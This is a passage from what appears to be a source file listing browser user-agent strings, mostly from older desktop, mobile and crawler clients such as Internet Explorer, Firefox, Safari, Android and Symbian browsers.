			"Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
			"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )",
			"Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) ",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
			"Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0",
			"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
			"Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]",
			"Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)",
			"Mozilla/4.8 [en] (Windows NT 5.1; U)",
			"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)",
			"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1",
			"Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
			"Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot) ",
			"Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
			"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; DragonFly) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0",
			"Mozilla/5.0 (compatible; Konqueror/4.3; Linux) KHTML/4.3.1 (like Gecko) Fedora/4.3.1-3.fc11",
			"Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu",
			"Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12",
			"Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
			"Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)",
			"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
			"Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Web Preview) Version/3.1 Safari/525.13",
			"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0",
			"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
			"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
			"Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/531.22.7",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420  (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3",
			"Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11a Safari/525.20",
			"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_1_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7C145",
			"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522  (KHTML, like Gecko) Safari/419.3",
			"Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-ch; HTC Hero Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-de; Galaxy Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; BNTV250 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; GT-P7100 Build/HRI83) AppleWebkit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
			"Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
			"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15  (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941",
			"Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0 ",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3",
			"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (MeeGo; NokiaN950-00/00) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
			"Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
			"Mozilla/5.0 (PLAYSTATION 3; 1.10)",
			"Mozilla/5.0 (PLAYSTATION 3; 2.00)",
			"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0",
			"Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
			"Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 SonyEricssonP100/01; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525",
			"Mozilla/5.0 (Unknown; U; UNIX BSD/SYSV system; C -) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.2",
			"Mozilla/5.0 (webOS/1.3; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Desktop/1.0",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
			"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
